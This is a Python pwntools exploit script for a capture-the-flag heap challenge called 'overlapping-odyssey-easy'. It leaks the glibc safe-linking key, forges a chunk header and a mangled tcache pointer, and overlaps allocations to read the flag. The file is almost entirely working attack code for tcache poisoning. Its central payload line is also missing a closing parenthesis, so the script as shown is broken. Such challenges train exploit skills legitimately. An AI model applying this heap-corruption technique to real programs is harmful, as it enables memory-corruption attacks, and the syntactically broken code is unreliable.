#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/overlapping-odyssey-easy")

def safe_read(io,index,data):
    payload = b"safe_read " + str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def safe_write(io,index):
    payload = b'safe_write ' + str(index).encode()
    io.sendline(payload)
    return io

def read_flag(io):
    io.sendline(b"read_flag")
    return io

def get_leak(io):
    data = io.recvuntil(b"[*]").decode()
    print(data)
    stack_leak = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    pie_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    print(stack_leak,pie_leak)
    return io,stack_leak,pie_leak

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size):
    payload = b"read " + str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def xor_num(n1,n2):
    return n1 ^ n2

def get_key(io):
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    io = malloc(io,0,0x258)
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    io = malloc(io,1,0x258)
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    io = malloc(io,2,0x258)
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    
    io = free(io,0)
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    io = malloc(io,0,0x258)
    print(io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):").decode())
    io = safe_write(io,0)
    data = io.recvuntil(b" Function (malloc/free/read_flag/safe_write/safe_read/quit):")
    print(data.decode('latin-1'))
    leak = int.from_bytes(data.split(b'Index:')[1].split(b"\n")[2][:5],"little")
    print(hex(leak))
    return io,leak

def main():
    io = process()
    io,key = get_key(io)
    io = free(io,2)
    io = free(io,1)
    """Here that 0x2c0 is the offset which is always same for the first heap allocation you can also actuomate to find the offset 
       without hard coded by usng:
           first, leak the key just i i did
           second, leak the pointer mangled value
           lastly, xor to get the actual pointer
        second process:- you can do  like
            after key leak then you can do like
            io = malloc(io,1,0x278)
            io = malloc(io,2,0x278)
            io = free(io,2)
            io = free(io,1)
            io = safe_write(io,0) # here 0 index because see that in key finding i use that io=malloc(0) at last and this will print the mangled address of the pointer index 1 and you can use that pointer as i use pointer 0 here
            

           """
    io = safe_read(io,0,b"\x00" * 0x258 + p64(0x261) + p64(xor_num((key<<12) + 0x2c0,key) 
    io = malloc(io,4,0x258)
    io = malloc(io,5,0x258)
    io = free(io,5)
    io = read_flag(io)
    io = safe_write(io,0)
    io = quit(io)
    io.interactive()
    



main()
